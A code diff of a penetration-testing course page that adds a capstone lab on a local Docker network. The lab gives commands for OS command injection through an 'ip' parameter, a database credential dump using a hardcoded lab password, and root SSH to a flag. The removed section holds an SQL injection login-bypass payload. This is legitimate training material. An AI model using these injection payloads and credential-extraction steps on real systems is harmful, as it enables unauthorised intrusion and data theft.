@@ -36,11 +36,17 @@
                 <li><a href="../../modules/security-controls/overview.html">Security Controls</a></li>
                 <li><a href="../../modules/physical-security/overview.html">Physical Security</a></li>
                 <li><a href="../../modules/reporting/overview.html" class="active">Reporting</a></li>
+                <li><a href="../../modules/mcq-test/overview.html">Final MCQ Test</a></li>
             </ul>
         </div>
     </nav>
     <main class="main-content" id="content-anchor">
         # Module: Reporting & Post Testing
+
+<div class="glass-card">
+  <h2>📚 Theory & Class Notes</h2>
+  <p><strong>Reporting</strong> is the absolute most critical phase of a Penetration Test. It translates highly complex technical exploitation into an actionable, business-focused risk narrative for executives to fund remediation.<br><br><strong>Key Components:</strong> Executive Summary (bottom line impact without jargon), Vulnerability Matrix (CVSS severities), Attack Narrative (how the kill-chain was formed laterally), and Technical PoCs for Developers to reproduce and patch.</p>
+</div>
 
 <div class="glass-card">
   <h2>1. Core Concept 🧠</h2>
@@ -93,54 +99,56 @@
 </div>
 
 <div class="glass-card">
-  <h2>3. Hands-on Lab 🧪</h2>
+  <h2>3. Capstone Final Exam: Lateral Movement Simulation 🧪</h2>
   
   <div class="lab-header">
-    <h3 class="lab-title">🧪 Lab: Writing a Critical Finding</h3>
+    <h3 class="lab-title">🔥 Lab: End-to-End Enterprise Breach</h3>
     <div class="lab-meta">
-      <span class="meta-badge">Topic: Documentation</span>
-      <span class="meta-badge difficulty-easy">Difficulty: Easy</span>
-      <span class="meta-badge">Time: 20 mins</span>
+      <span class="meta-badge">Topic: Full Kill Chain</span>
+      <span class="meta-badge difficulty-hard">Difficulty: Hard</span>
+      <span class="meta-badge">Time: 60 mins</span>
     </div>
-<div style="margin-top: 15px;"><a href="http://localhost:80" target="_blank" class="btn-start-lab">🚀 Start Lab Environment</a></div>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <button onclick="startLab('reporting')" class="btn-start-lab">▶ Start Capstone Infra</button>
+      <button onclick="stopLab('reporting')" class="btn-stop-lab">🛑 Stop Capstone Infra</button>
+      <a href="../../assets/VAPT_PTES_Report_Template.html" download="VAPT_PTES_Report_Template.html" class="btn-start-lab" style="background: #10b981; border-color: #059669; text-decoration: none;">📄 Download PTES Template</a>
+    </div>
   </div>
+  
+  <div id="console-reporting" style="display: none; background: #0f172a; color: #10b981; padding: 15px; border-radius: 6px; border: 1px solid #334155; margin-top: 15px; font-family: monospace; max-height: 200px; overflow-y: auto;"></div>
   
   <div class="lab-content">
     
     <div class="callout tip">
       <div class="icon">💡</div>
-      <div class="content"><strong>Pro Tip:</strong> Always use CVSS (Common Vulnerability Scoring System) to objectively justify why an issue is marked "Critical" rather than "High". Never skip the "Proof of Concept" (PoC) block; screenshots are mandatory for clients to believe you.</div>
+      <div class="content"><strong>Mission Briefing:</strong> This is your final exam. You are dropped into an enterprise network (`172.25.0.0/24`). Your goal is to hack the external Web server, extract hidden credentials, pivot into the isolated Database, steal the Domain Controller's SSH password, and extract the final flag from the internal network. Document EVERY step in your PTES report!</div>
     </div>
     
-    <h4>Architecture Diagram</h4>
-    <img src="../../assets/architecture_placeholder.png" alt="Workshop Diagram" style="width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: var(--box-shadow); margin-bottom: 2rem;">
+    <h4>The Kill Chain Stages</h4>
+    <p>Follow these steps to compromise the entire environment. Take screenshots of every successful compromise for your report.</p>
     
-    <h4>Report Section Template</h4>
-    <p>Craft a mock finding for the SQL Injection lab from earlier using this professional structure:</p>
+    <ol>
+        <li><strong>Stage 1: Initial Access (Web RCE):</strong><br>
+            A vulnerable "Network Diagnostic Tool" is running on port <code>8003</code>.<br>
+            <strong>Note:</strong> Ensure you are working from inside the Attacker container: <code>docker exec -it vapt_report_attacker /bin/bash</code><br><br>
+            <code>curl "http://172.25.0.20:8003/index.php?ip=127.0.0.1"</code><br>
+            Exploit the command injection vulnerability in the <code>?ip=</code> parameter to read the application's source code at <code>/var/www/html/config.php</code>.<br>
+            <em>Hint: <code>curl "http://172.25.0.20:8003/index.php?ip=127.0.0.1;%20cat%20config.php"</code></em>
+        </li>
+        <li style="margin-top: 15px;"><strong>Stage 2: Privilege Escalation & Pivoting (Database):</strong><br>
+            Using the hardcoded MariaDB credentials you discovered in <code>config.php</code>, pivot laterally from the web server into the isolated database server (`172.25.0.30`).<br>
+            Query the database for highly sensitive credentials:<br>
+            <code>mysql -h 172.25.0.30 -u root -p'M4ng0_D4t4b4s3_!@#' -e "USE company_vault; SELECT * FROM admin_creds;"</code>
+        </li>
+        <li style="margin-top: 15px;"><strong>Stage 3: Total Domain Compromise (SSH):</strong><br>
+            The database contained the plaintext SSH password for the internal server (`172.25.0.40`). Use it to establish an SSH session:<br>
+            <code>ssh root@172.25.0.40</code><br>
+            Extract the final workshop flag located at <code>cat /root/flag.txt</code>!
+        </li>
+    </ol>
     
-    <pre><code>**Finding 01: Unauthenticated SQL Injection in Login Portal**
-**Severity:** Critical (CVSS v3.1: 9.8 - Network/Low Complexity/No Privileges)
-**Affected URL:** `http://internal-app.local/login.php`
-
-**Description:**
-The login portal fails to sanitize user input in the `user` parameters before passing it to the database query. This allows an attacker to manipulate the backend query structure. 
-
-**Proof of Concept (PoC):**
-1. Navigate to the login page.
-2. Enter the payload `admin' OR 1=1 --` in the username field.
-3. Observe successful authentication bypassing the password check completely.
-
-<img src="../../assets/hacker_terminal.png" alt="Workshop Diagram" style="width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: var(--box-shadow); margin-bottom: 2rem;">
-<img src="../../assets/hacker_terminal.png" alt="Workshop Diagram" style="width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: var(--box-shadow); margin-bottom: 2rem;">
-
-**Business Impact:**
-An attacker can completely bypass authentication, allowing uninhibited access to sensitive employee data and financial records without needing valid credentials.
-
-**Remediation:**
-Implement Prepared Statements (Parameterized Queries) within the `login.php` codebase to separate SQL execution logic from user-supplied data strings.</code></pre>
-    
-    <h4>Expected Output</h4>
-    <p>A professional, highly clear finding that developers can immediately use to reproduce the error and fix it.</p>
+    <h4>Report Generation</h4>
+    <p>Once you have the flag, download the standard <strong>PTES Report Template</strong> using the green button above. Translate your technical exploitation into a professional security report. Map out vulnerabilities like 'Use of Hardcoded Credentials' and 'OS Command Injection', assign them Severity ratings, and write an Executive Summary explaining the risk. This is the hallmark of a true Pentester!</p>
   </div>
 </div>
 
@@ -152,6 +160,73 @@ Implement Prepared Statements (Parameterized Queries) within the `login.php` cod
     
 </main>
 </div>
+
+<script>
+    let logIntervals = {};
+
+    async function startLab(labName) {
+        const consoleDiv = document.getElementById('console-' + labName);
+        if(consoleDiv) {
+            consoleDiv.style.display = 'block';
+            consoleDiv.innerHTML = '<span style="color: #64748b;">[System] Sending Boot command for ' + labName + '...</span><br>';
+        }
+        
+        try {
+            let res = await fetch('/api/start?lab=' + labName);
+            let data = await res.json();
+            if (data.status === 'error' || !res.ok) {
+                if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + (data.message || 'Failed to start lab') + '</span><br>';
+                return;
+            }
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #3b82f6;">[System] ' + data.message + '</span><br>';
+            
+            if (logIntervals[labName]) clearInterval(logIntervals[labName]);
+            logIntervals[labName] = setInterval(() => pollLogs(labName), 2000);
+        } catch (e) {
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + e + '</span><br>';
+        }
+    }
+
+    async function stopLab(labName) {
+        const consoleDiv = document.getElementById('console-' + labName);
+        if (consoleDiv) {
+            consoleDiv.style.display = 'block';
+            consoleDiv.innerHTML += '<span style="color: #ef4444;">[System] Halting ' + labName + ' container...</span><br>';
+        }
+        
+        if (logIntervals[labName]) {
+            clearInterval(logIntervals[labName]);
+            delete logIntervals[labName];
+        }
+
+        try {
+            let res = await fetch('/api/stop?lab=' + labName);
+            let data = await res.json();
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #64748b;">[System] ' + data.message + '</span><br>';
+        } catch (e) {
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + e + '</span><br>';
+        }
+    }
+
+    async function pollLogs(labName) {
+        try {
+            let res = await fetch('/api/logs?lab=' + labName);
+            let data = await res.json();
+            const consoleDiv = document.getElementById('console-' + labName);
+            if (!consoleDiv) return;
+            
+            if (data.status === 'success') {
+                let safeLogs = data.logs.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                safeLogs = safeLogs.replace(/\n/g, "<br>");
+                const sysHeader = '<span style="color: #3b82f6;">[System] Streaming container logs...</span><br><br>';
+                consoleDiv.innerHTML = sysHeader + safeLogs;
+                consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            }
+        } catch (e) {
+            console.error("Log poll failed", e);
+        }
+    }
+</script>
 
 <script>
     // Theme toggling logic
